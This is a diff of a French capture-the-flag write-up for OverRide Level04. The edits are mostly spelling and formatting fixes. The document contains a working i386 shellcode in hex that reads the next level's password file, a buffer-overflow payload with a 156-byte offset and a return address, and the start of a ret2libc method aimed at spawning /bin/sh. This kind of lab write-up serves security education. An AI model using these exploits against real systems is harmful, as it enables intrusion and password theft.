@@ -1,13 +1,10 @@
 # Level04
 
-Nous remarquons la presence d'un fork, ainsi que des check, qui arrete le programme,
-si on execve est appele.
-Nous devons realiser notre propre shellcode file reader architecture i386,
-il fera un open, read et write sur le fichier .pass du level suivant.
+Nous remarquons la présence d'un fork, ainsi que des check, qui arrête le programme, si un execve est appelé.
+Nous devons réaliser notre propre [shellcode](./resources/shellcode_file_reader.s) pour lire un fichier en architecture i386,
+il fera un open, read et write sur le fichier `.pass` du level suivant.
 
-Le code asm est disponnible dans le fichier shellcode_file_reader.s dans le dossier resources.
-
-Nous l'assemblons avec nasm et le linker ld pour pouvoir recuperer le shellcode en hexa.
+Nous l'assemblons avec `nasm` et le linker `ld` pour pouvoir récupérer le shellcode en hexa.
 
 ```
 nasm -f elf32 ./resources/shellcode_file_reader.s -o ./resources/shellcode.o
@@ -15,7 +12,7 @@ ld -m elf_i386 ./resources/shellcode.o -o ./resources/shellcode
 chmod +x ./resources/shellcode
 ```
 
-Ensuite nous recuperons sont code en hexa grace a obj dump.
+Ensuite nous récupérons son code en hexa grâce à `objdump`.
 
 ```
 $ objdump -d resources/shellcode
@@ -74,24 +71,24 @@ On lance gdb normalement puis on le passe en mode debugging forks child:
 set follow-fork-mode child
 ```
 
-De la meme maniere qu'auparavant on trouve l'offset a 156 bytes.
+De la même manière qu'auparavant on trouve l'offset à 156 bytes.
 
-on export tout d'abord le shellcode dans l'env comme si dessous:
+on export tout d'abord le shellcode dans l'env comme ci-dessous:
 ```
 level04@OverRide:~$ export SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x92\xb3\x01\xc1\xe8\x0a\xcd\x80\x93\xcd\x80"'`
 ```
 
-puis on trouve l'adressse du NOP le plus proche du shellcode:
+puis on trouve l'adressse du `NOP` le plus proche du shellcode:
 ```0xffffd8b0```
 
-Place a l'injection:
+Place à l'injection:
 ```
 level04@OverRide:~$ python -c 'print "B" * 156 + "\xb0\xd8\xff\xff"' | ./level04
 ```
 
 # Methode 2 (ret2libc)
 
-Création du ret2libc, pour cela nous avons besoin de l'adresse de `system` et de `exit` et de l'adresse de `/bin/sh` dans la libc.
+Création du ret2libc, pour cela nous avons besoin de l'adresse de `system` d´`exit` et de `/bin/sh` dans la libc.
 ```
 $ gdb ./level04
 (gdb) b main
